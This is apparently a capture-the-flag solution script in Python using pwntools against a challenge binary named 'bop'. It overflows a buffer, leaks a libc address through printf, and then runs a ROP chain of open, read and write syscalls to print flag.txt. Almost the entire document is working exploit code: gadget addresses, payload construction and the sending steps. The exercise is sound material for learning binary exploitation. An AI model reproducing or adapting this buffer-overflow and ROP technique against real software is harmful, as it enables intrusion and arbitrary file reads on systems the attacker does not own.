from pwn import *

exe = ELF('./bop')
libc = ELF('./libc.so.6')

io = exe.process()
#gdb.attach(io, api=True)
#io = remote('mc.ax',30284)

#Gadgets
#Exe:
offset = b'a'*40
fmt_str = 0x00404500
pop_rdi = 0x00000000004013d3
pop_rsi_r15 = 0x00000000004013d1
ret = 0x000000000040101a
main = 0x4012f9

#Libc
syscall_ret = 0x00000000000630a9
mov_edi_eax = 0x000000000005b623
pop_rax = 0x0000000000036174
pop_rdx = 0x0000000000142c92

leak_offset = 0x1ec980


# 1st chain to get libc address:
payload = offset + p64(pop_rdi) + p64(fmt_str) + p64(exe.plt['gets'])
payload += p64(pop_rdi) + p64(fmt_str) + p64(exe.plt['printf']) + p64(ret)
payload += p64(main)

io.recvuntil(b'bop?')
io.sendline(payload)

io.sendline(b'%3$p\0   flag.txt\0')
io.recvuntil(b'0x')
leak = io.recv(12).decode()
print(f'Leak _IO_2_1_stdin_ address: 0x{leak}')
libc.address = int(leak, 16) - leak_offset
print(f'Libc base address: {hex(libc.address)}')

# 2nd chain to open -> read -> write flag.txt
# Open
payload = offset
payload += p64(pop_rax + libc.address) + p64(2) #Syscall for open
payload += p64(pop_rdi) + p64(fmt_str + 8) #Address of string flag.txt
payload += p64(pop_rsi_r15) + p64(0) + p64(0)
payload += p64(pop_rdx + libc.address) + p64(0)
payload += p64(ret)
payload += p64(syscall_ret + libc.address)

# Read
payload += p64(mov_edi_eax + libc.address) # Move fd from rax to rdi
payload += p64(pop_rax + libc.address) + p64(0) #Syscall for read
payload += p64(pop_rsi_r15) + p64(fmt_str) + p64(0) #Address to write content of flag.txt to
payload += p64(pop_rdx + libc.address) + p64(100) #Read 100 characters
payload += p64(ret)
payload += p64(syscall_ret + libc.address)

# Write
payload += p64(pop_rax + libc.address) + p64(1) #Syscall for write
payload += p64(pop_rdi) + p64(2) #Write to stdout
payload += p64(pop_rsi_r15) + p64(fmt_str) + p64(0) #Address to print content of flag.txt from
payload += p64(pop_rdx + libc.address) + p64(100) #Print 100 characters
payload += p64(ret)
payload += p64(syscall_ret + libc.address)

payload += p64(ret)
payload += p64(main)

io.sendline(payload) #Remember to fucking send the payload
io.interactive()